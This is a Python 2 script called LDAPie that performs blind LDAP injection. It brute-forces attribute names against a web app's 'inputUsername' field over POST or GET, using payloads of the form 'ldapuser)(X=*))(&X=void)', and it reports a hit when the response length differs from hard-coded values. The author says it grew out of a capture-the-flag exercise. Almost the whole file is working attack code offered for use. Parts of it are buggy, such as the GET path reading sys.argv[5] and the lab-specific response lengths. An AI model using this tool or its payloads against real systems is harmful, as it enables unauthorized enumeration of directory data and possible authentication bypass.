#/usr/bin/env python2
#Title: LDAPie
#Author: Tepidangler
#Date: Today
#Description: A tool to bruteforce LDAP attributes and Values on a webapp that makes LDAP queries using both POST and
#	      GET requests. I got the idea for this tool while doing a CTF ;) and making manual Blind LDAPi's now I'm
#	      passing the savings onto YOUUUUU!!!!!!!!! XD

# importing the modules we'll need

import requests, sys, time
import argparse as ap

#Let's make things look a little bit better and easier for people to use
print("""\033[1;36m
#####################################################
	 Welcome to LDAPie by Tepidangler
	 Email: tepidangler@protonmail.com
	 Info: This is a program created out of 
               necessity since I couldn't find a
	       program that did LDAP injection
               via POST requests
         TODO: loosen up request params, automate
               IF URL IS NOT SET YOU WILL GET FALSE NEGATIVES :)
#####################################################
USAGE: python LDAPie.py <opts> <get/post> <url> 
-h for help
""")

# making our class

class LDAPie:

#Initialize the program
    def __init__(self,wordlist,url):
        self.wordlist = wordlist
        self.url = url

#Function to take the file from sys args, read them, then we'll use that to build our request
    def post(self,wordlist,url):

        with open(wordlist, 'r') as f:
            a = f.read().splitlines()
            for x in a:
                data = {'inputUsername':'ldapuser)('+x+'=*))(&'+x+'=void)'}
                h = {'Connection':'Close'}
                time.sleep(5)
                r = requests.post(url,headers=h,data=data)
                l = r.text
                if len(l) not in [2810,2822]:
                    print("\033[1;32mVALID LDAP INJECTION: "+str(data))
            pass

    def get(self,wordlist,url):
        with open(wordlist, 'r') as f:
            a = f.read().splitlines()
            for x in a:
                url = sys.argv[5]+'/?inputUsername=ldapuser)('+x+'=*))(&'+x+'=void)'
                r = requests.get(url)
                l = r.text
                print(url)
                if len(l) not in [1,2]:
                   print("\033[1;32mVALID LDAP INJECTION: "+url)
#main
#SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
post = False
get = False
wordlist = None
url = None

arg_index = 0
for arg in sys.argv:
    if (arg == "-h"):
        print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-h                      help
""")
        sys.exit(0)
    elif (arg == "-w"):
        wordlist = sys.argv[arg_index + 1]
    elif (arg == "-u"):
        url = sys.argv[arg_index + 1]
    elif (arg == "-p"):
        post = True
    elif (arg == "-g"):
        get = True
    arg_index = arg_index + 1

m = LDAPie(wordlist,url)
if post == True:
    p = m.post(wordlist,url)
    pass
if get == True:
    g = m.get(wordlist,url)
    pass

elif get == False or post == False:
    print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-h                      help
""")
elif wordlist == None or url == None:
    print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-h                      help
""")

